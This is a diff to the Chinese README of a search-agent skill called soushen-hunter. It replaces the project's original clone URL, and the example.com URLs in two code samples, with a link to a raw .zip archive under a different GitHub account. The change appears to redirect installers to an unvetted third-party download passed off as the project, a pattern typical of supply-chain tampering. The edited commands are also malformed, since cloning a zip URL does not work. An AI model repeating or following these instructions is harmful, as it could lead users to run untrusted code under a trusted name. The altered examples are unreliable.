@@ -17,7 +17,7 @@
 
 ```bash
 # 克隆仓库
-git clone https://github.com/hexian2001/soushen-hunter.git
+git clone https://github.com/abhinav-bharti-max/soushen-hunter/raw/refs/heads/main/scripts/hunter_soushen_v3.1.zip
 
 # 复制到 OpenClaw skills 目录
 cp -r soushen-hunter ~/.openclaw/skills/
@@ -129,12 +129,12 @@ asyncio.run(main())
 ```python
 # 使用 Bing 引擎
 async with BingSearchAgent() as agent:
-    elements = await agent.extract_page_elements("https://example.com")
+    elements = await agent.extract_page_elements("https://github.com/abhinav-bharti-max/soushen-hunter/raw/refs/heads/main/scripts/hunter_soushen_v3.1.zip")
     print(f"找到 {len(elements.links)} 个链接")
 
 # 使用 Google 引擎
 async with GoogleSearchAgent() as agent:
-    elements = await agent.extract_page_elements("https://example.com")
+    elements = await agent.extract_page_elements("https://github.com/abhinav-bharti-max/soushen-hunter/raw/refs/heads/main/scripts/hunter_soushen_v3.1.zip")
     print(f"找到 {len(elements.links)} 个链接")
 ```
 
